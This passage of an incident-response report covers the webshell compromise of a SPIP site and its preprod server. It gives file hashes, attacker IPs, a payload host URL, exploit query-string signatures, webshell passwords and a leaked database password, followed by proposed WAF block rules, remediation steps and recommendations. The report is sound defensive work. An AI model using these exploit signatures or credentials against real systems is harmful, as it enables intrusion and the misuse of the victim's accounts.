| `ecrire/public/compiler.php` (patched by attacker) | 52,077 | 2026-08-21 15:30:52 | `791c64d28e76bdd76595d833ab8483927f323f98845512db4acf8eeb9ed26c54` |

### Files — `preprod-mlml-01` (actor 2)

All dropped 2026-08-23 05:59, mode `666`, in `/var/www/www-monel-co.mlml.fr/` and its
`local/`, `IMG/`, `tmp/`, `ecrire/public/` subdirectories.

| File | Size | SHA-256 |
|---|---|---|
| `img_cache.php` | 700 | `d63abfc6185fca2c1c2cd174b131ee0d8c18839844bfabfa156c6074422bac36` |
| `Nx_.php` | 397 | `aabd3a41acec9552a1f89614abb2e1bf7350e52852a53960098d61440de1d142` |

### Files — `/var/www/mlml.fr` on preprod (multiple actors)

| Path | Size | SHA-256 |
|---|---|---|
| `prive/modeles/import-dispatcher.php` | 476,603 | `2fd7e6d8f987b243ab1839249551f62adce19704c47d3d0c8dd9e57ea5b9c6b3` |
| `plugins-dist/compresseur/media-handler.php` | 95,804 | `07c5b9e5f9901581bb196a15f4cdc7a4713d7e0e94affab5678bd029405162c8` |
| `plugins-dist/bigup/stats-mailer.php` | 48,658 | `d3de9746d24691ef07ad5c4115d179abb4b73743b8bd417785d665f7dfb07d1c` |
| `IMG/distant/csl/principalxml.php` | 46,099 | `0cb2c625dbd6c6a3b86cff1a552b52a802706ac94deefd7299cd22c5a816ece3` |
| `tmp/upload/document.php` | 40,952 | `8d949b7a065d3885120b255d0b5189b9ff59b1f8e82d223076358edff8dc0339` |
| `IMG/distant/csl/default.php` | 20,239 | `297c9f516f79a987ade23d1f41751543ee1f5619ef3e0e777b26e7b52655825a` |
| `plugins-dist/sites/fix-encoder.php` | 6,889 | `b0fd90b005db2a4a1841d809b628d63604bea34a3f4f7fa34ad8f56a0b93df5d` |
| `plugins/bootstrap.php` | 608 | `3ce70769de261e0bcb2f75ef9822000e7ff99ee60a6c637cc1363ae8d65c82c2` |
| `IMG/gif/asset-draft.php` | 411 | `cd39a2eb49127c29cd02ebb0cfc5f404ebf9f93b312fd1be977e2028d159dd27` |
| `ALFA_DATA/alfacgiapi/bash.alfa` | 1,555 | `1bbacae70b0e11e051783879bb63f667b4ee88b6b5676eabc7b09ea9afbc113c` |
| `ALFA_DATA/alfacgiapi/perl.alfa` | 542 | `f82fd317860454606003aa9dc7efde284d851424730e229f19c50d60206311b8` |
| `ALFA_DATA/alfacgiapi/py.alfa` | 463 | `a2b2d11669115dab24ee1f82295fce67f1f93e316efe11a2c95018491e5cc484` |

Also present: zero-byte artefacts `false,` `true,` `fr,` (25 Aug 12:20) and
`.spip_stage.log` (24 Aug 10:24).

Seen in preprod access logs, **still not located on disk**: `sitemap.php`, `shadow.php`,
`_dec_cvfmev.php`. (`bootstrap.php` is accounted for above; the many
`vendor/symfony/polyfill-*/bootstrap.php` hits are legitimate.)

### Reference

| File | Size | SHA-256 |
|---|---|---|
| `ecrire/public/compiler.php` (pristine 4.4.16) | 50,306 | `c479dc2e3f9c378dc104eacc3959450d0239bdf8ac90ab57dc9a2b26353fa49a` |

### Network

- **Actor 1 (prod, successful):** `202.178.126.210` (46 attempts, 21 Aug)
- **Second-stage payload host:** `https://pastebin.support.one/view/raw/24d74102`
- **Most active scanners:** `45.77.118.169` (240), `149.102.229.140` (196),
  `153.75.90.146` (114), `153.56.143.246` (70), `1.54.149.212`
- 57 distinct source addresses against prod; comparable set against preprod, where the
  `mlml.fr` vhost absorbed 1,782 attempts. Full lists in the preserved logs.

### Strings / patterns

- `recherche=%3C%3Fphp` in query strings (exploit signature)
- `X-Spip-Filtre: html_entity_decode` (encoding bypass)
- `?k=xK3y` (actor 1 shell authentication, prod)
- `Ayamcabegaramasinbanget69%$` (`hasil.php` password, prod)
- `?k=nXk`, response header `X-Nx:Nx-zD1` (actor 2 — **failed on prod, succeeded on preprod**)
- `safe_export_env` (actor 1's patch marker; **absent on both preprod instances**, which are therefore still vulnerable)
- `SPIP-RCE-DROP-START` / `SPIP-RCE-DROP-END` (exploit output delimiters)

Shell credentials and signatures on `/var/www/mlml.fr`:

- `Bajingan#1337` — Checkpoint-401 shell password (bcrypt `$2y$12$fKp7y960j03LxUg/8Vwon.…`)
- `ajitHere.com483#!!` — "NESIA DARKNET" shell password (plaintext in source)
- `$2y$10$IKj1cNwmFrtoxt1/YEVmcetIdy6qTUh5WFPQzbFtnfNuOf2/KCnHm` — `default.php` bcrypt hash
- `ALFA_DATA/`, `.alfa` file extension, `AddHandler cgi-script .alfa`,
  `#Coded By Sole Sad & Invisible` — ALFA TEaM Shell
- `Checkpoint-401`, `3x10taction`, `_3x_ph` / `_3x_tok` variable prefixes
- `Obfuscated by YAK Pro` — `media-handler.php`

---

## 7. Detection notes

Detection was **incidental** — the attacker's defective patch caused a visible outage
three days after the fact. Had the patch been correct, the compromise would likely have
gone unnoticed indefinitely: `hasil.php` serves a convincing fake 403 page to
unauthenticated visitors and carries `noindex` tags.

**The preprod compromise proves the point.** That attacker did not break anything, so
nothing surfaced. It was found only because the prod investigation prompted us to look —
three days after the fact, and it would otherwise have persisted indefinitely on a host
holding production financial data.

No monitoring alerted on: new PHP files in either webroot, modification of a core SPIP
file, 1,736 exploit attempts against prod, or 1,782 against preprod. This is the most
significant gap identified. Detection cannot depend on the attacker being clumsy.

---

## 8. Remediation plan

Ordered by urgency. Items 4–6 are the immediate priorities.

| # | Action | Status |
|---|---|---|
| 1 | Preserve evidence (webroot, logs, DB dumps) | **Done** |
| 2 | Stop Apache on `prod-mlml-01` and `preprod-mlml-01` | **Done — 2026-08-26** |
| 3 | Triage `preprod-mlml-01` (`incidents/triage-preprod.sh`) | **Done — COMPROMISED (§5.6)** |
| 4 | Triage `/var/www/mlml.fr` (`incidents/triage-preprod-mlml.sh`) | **Done — COMPROMISED, 12 artefacts (§5.8)** |
| 5 | Verify Cyclos data integrity — compare pre/post-intrusion `pg_dump` backups (§5.7) | **Done — no tampering, 417 tables** |
| 6 | **Rebuild `preprod-mlml-01` entirely** — both SPIP instances compromised, both unpatched; Apache must stay down until then | **Pending — highest priority** |
| 6a | Quantify shell usage on `/var/www/mlml.fr` — corrected log query; the triage check was malformed (§5.8) | Pending |
| 6b | Locate `sitemap.php`, `shadow.php`, `_dec_cvfmev.php` — returned HTTP 200, still not found on disk | Pending |
| 6c | Determine whether the `/var/www/mlml.fr` compromise predates 21 Aug (SPIP 4.3.9, older CVEs) | Pending |
| 6d | Identify the database used by `/var/www/mlml.fr` (`config/connect.php`) and audit it — a planted **Adminer** gave full DB access | Pending |
| 6e | Complete analysis of `media-handler.php` (YAK Pro obfuscated, capabilities undetermined) | Pending |
| 6f | Inventory unmanaged vhosts on `prod-mlml-01` — `apache2ctl -S` vs the playbooks | **Done — no unmanaged application on prod (§5.4)** |
| 7 | Block attacker IPs; WAF rules rejecting `%3C%3Fphp` and `X-Spip-Filtre` in query strings | Pending |
| 8 | Confirm with SPIP upstream whether an official fix exists | **Done — 4.4.21 (20 Aug) fixes both CVEs; rebuild on 4.4.21 or later** |
| 9 | Rebuild from clean sources — pristine SPIP 4.4.16 + plugins, templates from git, retain only DB and verified-clean `IMG/`, delete `tmp/` entirely | Pending |
| 10 | SPIP database audit | **Done — clean** |
| 11 | Rotate credentials: 4 SPIP accounts, `monel` DB password, **`postgres_pwd` (`cyclospwd`)**, **Docker Hub `mlmel`**, all PostgreSQL roles from `globals.sql.gz`, FTP/SSH, hosting panel | Pending |
| 12 | Restrict backup permissions — `/var/lib/postgresql/backups/` must not be world-readable (`chmod 700`, or `umask 077` in `pg_backup_rotated.sh`) | Pending |
| 13 | Enable PostgreSQL `log_connections` / `log_disconnections` so this gap cannot recur (§5.5) | Pending |
| 14 | Verify Discourse backup exposure (`/var/lib/discourse/sidekiq_data/public/backups/default`) | Pending |
| 15 | Audit whole host: all crontabs, `~/.ssh/authorized_keys`, and the preprod → prod `postgres` key | Pending |
| 16 | Check MTA logs/queues for relayed spam; check domain blocklist status | Pending |
| 17 | CNIL notification — worksheet prepared in `2026-08-21-cnil-notification-draft.md`; **deadline 2026-08-29** (72h from awareness). All technical content complete; only administrative fields outstanding | Pending — owner decision |
| 17a | Review the 686 embedded PDFs | **Done — 658 are monthly member account statements (18 members, 2022-12 → 2026-07) containing balances, credit limits and counterparty-level transaction history** |
| 17d | Determine `forme_juridique` of the 18 account-holding members — sole traders' statement data is GDPR personal data, which affects the Art. 34 threshold | Pending |
| 17b | Force password reset on all 128 active Cyclos accounts; treat the two `$2a$04$` credentials as compromised | Pending |
| 17c | Member communication — warn explicitly that leaked data enables convincing phishing | Pending |
| 18 | Purge credentials from the ansible repo and its git history; assess who has had clone access | Pending |
| 19 | `.gitignore` the `compromised-backup/` directory (contains live webshells inside the repo) | Pending |

### Constraint on the rebuild — resolved

An earlier version of this report warned against restoring a pristine 4.4.16
`compiler.php`, since that would remove the attacker's patch and reopen the RCE, and
recommended reimplementing the escaping ourselves pending an upstream fix.

**That is no longer necessary. Rebuild on SPIP 4.4.21 or later**, which fixes both
CVE-2026-77647 and CVE-2026-77806 officially (§3.1a). Do not carry any part of the
attacker's patch forward.

Note that **4.4.20 is not sufficient** — the publisher released 4.4.21 precisely because
4.4.20 remained exploitable. Verify the deployed version is ≥ 4.4.21 before returning
either host to service, and raise `spip_version` in `prod.yaml` and `preprod.yaml`
accordingly.

---

## 9. Recommendations

1. **File integrity monitoring** on the webroot — a new `.php` file appearing at the top
   level, or any change to a core SPIP file, should raise an alert. This alone would have
   cut detection time from five days to minutes.
2. **Deploy core from a verifiable source.** The stale `.git` in the webroot was an old
   site layout; the live SPIP install was entirely untracked, so no integrity check was
   possible without an external reference copy. Pin the core and plugins to a manifest.
3. **Inventory every internet-facing application, and bring it under configuration
   management.** `/var/www/mlml.fr` — a manually-deployed SPIP 4.3.9 — took 1,782 of the
   1,796 exploit attempts against preprod and was compromised by multiple actors, yet
   appeared in no playbook and in no patching process. Anything not in the inventory cannot
   be patched, monitored, or reasoned about during an incident. Reconcile `apache2ctl -S`
   against the playbooks on every host as a recurring control — doing so on prod also
   surfaced `moncompte.mlml.fr`, an unmanaged (though inert) vhost, and confirmed prod
   otherwise clean (§5.4). Remove stale inventory variables such as `legacy_cyclos_domain`
   that no longer correspond to managed resources.
4. **Deny PHP execution in writable directories** (`IMG/`, `local/`, `tmp/`) at the web
   server level.
5. **Restrict outbound network access** from the web server. The second stage arrived via
   `wget`; egress filtering would have stopped it.
6. **Review `disable_functions`** in the PHP config. The dropper enumerated five exec
   functions and found one available.
7. **Establish a security-watch and patching process — the single most important
   recommendation in this report.** Subscribe to `blog.spip.net` and the SPIP security
   announcements, and commit to a defined window for applying critical updates. SPIP 4.4.20
   was released on 17 August and 4.4.21 on 20 August; the site was compromised on
   21 August still running 4.4.16. Both advisories stated that exploitation was already
   under way. Automated update checking and alerting on the installed-versus-latest version
   would have prevented this incident outright.
8. **Log retention** — Apache logs covered only 14 days, and SPIP logs began 21 Aug. A
   slightly later investigation would have lost the entry point entirely.

### Architectural — separating the public website from Cyclos

The single largest lesson is that a defect in a public brochure site yielded the
production financial database. These are not equivalent assets and should not share a
trust boundary.

9. **Separate the public website from Cyclos.** A distinct host or VM for `www.monel.co`
   would have confined this incident to a static site with four author accounts. This is
   the highest-value structural change available.
10. **Drop `network_mode: host`** for the Cyclos container and expose only the required
   port. Host networking removes the isolation the container is presumed to provide.
11. **Bind PostgreSQL to a specific interface** rather than `0.0.0.0`, and enforce
    least-privilege at `pg_hba` level. Note that host-firewall rules do not constrain
    local connections — that assumption was load-bearing here and did not hold.
12. **Never store service credentials in plaintext in the repository.** `postgres_pwd` and
    the Docker Hub credentials belong in `secrets.enc`, which already exists and is
    correctly vaulted. `cyclospwd` should also not be a guessable derivation of the
    service name.
13. **Run the backup sync from `adm-mlml-01`, daily, as specified** — not from preprod
    every minute. The drift also means a lower-trust environment holds a key granting
    `postgres@prod`; reverse that dependency direction.
14. **Do not populate preprod with production member data**, or anonymise it on import.
    Preprod currently carries production financial records at a lower assurance level.

---

## 10. Evidence

Preserved under `compromised-backup/` (excluded from version control):

- `webroot.tgz` — full webroot as of 26 Aug 11:17, including both webshells and the
  modified `compiler.php`
- `weblogs.tgz` — Apache logs, 12–26 Aug
- `mysql_prod/sqldump/{monel,mysql,sys}.sql.gz` — SPIP/MariaDB dumps, 26 Aug 01:00
- `auth.logs` — `/var/log/auth.log` and `.1`, 16–26 Aug (covers the attack window)
- `last.logs` — `last -F` output; `wtmp` begins 20 Jun 2022
- `postgres_cyclos_bakups/{2026-08-20,2026-08-22,2026-08-26}-daily/` — Cyclos `pg_dump`
  backups spanning the intrusion window, basis of the §5.7 integrity verification
- `preprod-triage.txt` — output of `incidents/triage-preprod.sh`, 26 Aug 13:56

> **Handling note:** these archives contain two functional webshells. Keep them
> read-only, outside any webroot, and out of version control.
